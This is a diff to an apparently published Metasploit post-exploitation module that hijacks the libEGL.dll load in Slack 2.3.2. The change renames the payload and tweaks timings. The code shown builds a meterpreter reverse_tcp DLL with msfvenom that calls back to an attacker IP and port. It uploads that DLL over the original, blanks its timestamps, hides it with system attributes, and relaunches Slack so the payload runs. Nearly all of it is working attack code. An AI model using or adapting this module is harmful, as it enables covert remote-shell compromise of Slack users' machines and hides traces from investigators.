@@ -23,14 +23,14 @@
 # "WARNING: This module will not delete the payload deployed"
 #
 # [ BUILD MALICIOUS DLL ]
-# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=1337 -a x86 --platform windows -f dll -o lbEGL.dll
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=1337 -a x86 --platform windows -f dll -o libEGL.dll
 #
 #
 #
 # [ MODULE DEFAULT OPTIONS ]
 # The session number to run this module on        => set SESSION 3
-# The full path (local) of payload to be uploaded => set LOCAL_PATH /root/lbEGL.dll
-# Revert lbEGL.dll to is default stage?           => set REVERT_HIJACK true
+# The full path (local) of payload to be uploaded => set LOCAL_PATH /root/libEGL.dll
+# Revert libEGL.dll to is default stage?           => set REVERT_HIJACK true
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -82,7 +82,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'dll hijacking in slack 2.3.2 software',
                         'Description'   => %q{
-                                        This post-exploitation module requires a meterpreter session to be able to upload/inject our lbEGL.dll "WARNING: payload to send must be named as: lbEGL.dll"
+                                        This post-exploitation module requires a meterpreter session to be able to upload/inject our libEGL.dll "WARNING: payload to send must be named as: libEGL.dll"
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -120,7 +120,7 @@ class MetasploitModule < Msf::Post
                 register_options(
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
-                                OptString.new('LOCAL_PATH', [ false, 'The full path of lbEGL.dll to upload (eg /root/lbEGL.dll)'])
+                                OptString.new('LOCAL_PATH', [ false, 'The full path of libEGL.dll to upload (eg /root/libEGL.dll)'])
                         ], self.class)
 
                 register_advanced_options(
@@ -155,9 +155,9 @@ def ls_stage1
 
   r=''
   session = client
-  p_name = "lbEGL.dll" # malicious lbEGL.dll
+  p_name = "libEGL.dll" # malicious libEGL.dll
   s_name = "slack.exe" # service executable
-  u_path = datastore['LOCAL_PATH']   # /root/lbEGL.dll
+  u_path = datastore['LOCAL_PATH']   # /root/libEGL.dll
   d_path = "%localappdata%\\slack\\app-2.3.2" # remote path on target system
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
@@ -171,28 +171,29 @@ def ls_stage1
   end
 
 
-    # check if original lbEGL.dll exist in target
+    # check if original libEGL.dll exist in target
     if client.fs.file.exist?("#{d_path}\\#{p_name}")
       print_warning(" Vulnerable dll agent: #{p_name} found!")
       # backup original dll
-      r = session.sys.process.execute("cmd.exe /c COPY /Y #{p_name} lbEGL.bk", nil, {'Hidden' => true, 'Channelized' => true})
-      sleep(1.5)
+      r = session.sys.process.execute("cmd.exe /c COPY /Y #{p_name} libEGL.bk", nil, {'Hidden' => true, 'Channelized' => true})
+      sleep(1.0)
 
-      # upload our malicious lbEGL.dll into target system..
+      # upload our malicious libEGL.dll into target system..
       print_good(" Uploading: #{p_name} malicious agent...")
       client.fs.file.upload("#{d_path}\\#{p_name}","#{u_path}")
+      sleep(1.0)
       print_good(" Uploaded: #{u_path} -> #{d_path}\\#{p_name}")
       sleep(1.0)
 
-        # Change remote malicious lbEGL.dll timestamp (date:time)
+        # Change remote malicious libEGL.dll timestamp (date:time)
         print_good(" Blanking malicious dll agent timestamp...")
         client.priv.fs.blank_file_mace("#{d_path}\\#{p_name}")
         sleep(1.5)
 
-      # change attributes of lbEGL.dll to hidde it from site...
+      # change attributes of libEGL.dll to hidde it from site...
       r = session.sys.process.execute("cmd.exe /c attrib +h +s #{d_path}\\#{p_name}", nil, {'Hidden' => true, 'Channelized' => true})
       print_good(" Execute => cmd.exe /c attrib +h +s #{d_path}\\#{p_name}")
-      sleep(1.5)
+      sleep(1.0)
 
           # start remote malicious service
           print_status("Sart remote slack service!")
